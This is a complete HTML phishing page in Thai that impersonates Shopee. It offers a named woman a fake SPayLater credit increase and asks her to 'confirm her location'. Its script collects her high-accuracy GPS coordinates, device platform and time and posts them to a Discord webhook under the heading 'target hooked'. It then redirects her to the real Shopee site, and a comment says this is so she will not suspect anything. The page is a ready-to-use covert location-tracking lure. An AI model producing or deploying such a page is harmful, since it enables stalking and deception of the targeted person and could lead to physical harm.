<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shopee | ตรวจสอบสิทธิ์เพิ่มวงเงิน</title>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        /* ปรับธีมเป็น Shopee สีส้ม */
        body { font-family: 'Kanit', sans-serif; background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); text-align: center; max-width: 400px; width: 90%; border-top: 6px solid #ee4d2d; }
        
        .shopee-logo { width: 120px; margin-bottom: 20px; }
        h1 { font-size: 20px; color: #ee4d2d; margin-bottom: 10px; }
        
        .info-box { background: #fff5f1; padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #ffdbd0; text-align: left; }
        .info-label { font-size: 13px; color: #666; display: block; }
        .info-value { font-size: 15px; color: #333; font-weight: 600; }
        
        p { font-size: 14px; color: #555; line-height: 1.5; margin-bottom: 25px; }
        
        /* ปุ่มสีส้ม Shopee */
        button { background-color: #ee4d2d; color: white; border: none; padding: 15px; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; transition: 0.2s; }
        button:hover { background-color: #d73d17; }
        
        .footer { margin-top: 20px; font-size: 11px; color: #bbb; }
    </style>
</head>
<body>

<div class="container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" class="shopee-logo" alt="Shopee">
    
    <h1>เพิ่มวงเงิน SPayLater พิเศษ</h1>
    
    <div class="info-box">
        <span class="info-label">บัญชีผู้ใช้:</span>
        <span class="info-value">วราภรณ์ ดีสอน (ตรวจสอบแล้ว)</span>
    </div>
    
    <p>เนื่องจากคุณได้รับสิทธิ์เพิ่มวงเงินเป็น <b>45,000 บาท</b> กรุณายืนยันตำแหน่งปัจจุบันเพื่อความปลอดภัยและรับสิทธิ์ทันที</p>
    
    <button onclick="getLocation()">ตรวจสอบพิกัดและรับสิทธิ์</button>
    
    <div class="footer">© 2026 Shopee Thailand. All Rights Reserved.</div>
</div>

<script>
    // *** ยูยูเอา Webhook URL จาก Discord มาวางตรงนี้ครับ ***
    const DISCORD_WEBHOOK = "ใส่_URL_จาก_NOTEPAD_ตรงนี้";

    function getLocation() {
        if (navigator.geolocation) {
            const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
            navigator.geolocation.getCurrentPosition(sendData, showError, options);
        } else {
            alert("อุปกรณ์ไม่รองรับการยืนยันตัวตน โปรดเปลี่ยนเบราว์เซอร์");
        }
    }

    function sendData(position) {
        const data = {
            content: "🎯 **เป้าหมายติดเบ็ดแล้ว!**",
            embeds: [{
                title: "📍 ข้อมูลพิกัด GPS จริง",
                color: 15548997,
                fields: [
                    { name: "👤 ชื่อเป้าหมาย", value: "วราภรณ์ ดีสอน", inline: true },
                    { name: "📱 อุปกรณ์", value: navigator.platform, inline: true },
                    { name: "📌 Google Maps", value: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}` },
                    { name: "📏 ความแม่นยำ", value: position.coords.accuracy + " เมตร" },
                    { name: "⏰ เวลา", value: new Date().toLocaleString() }
                ]
            }]
        };

        // ส่งข้อมูลเข้า Discord
        fetch(DISCORD_WEBHOOK, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        }).then(() => {
            alert("ยืนยันตัวตนสำเร็จ ระบบกำลังนำคุณไปที่หน้า Shopee");
            // พาไปหน้า Shopee จริงๆ เพื่อไม่ให้สงสัย
            window.location.href = "https://shopee.co.th/m/spaylater";
        });
    }

    function showError(error) {
        alert("กรุณากด 'อนุญาต' (Allow) เพื่อรับสิทธิ์เพิ่มวงเงินกู้ของคุณ");
    }
</script>

</body>
</html>
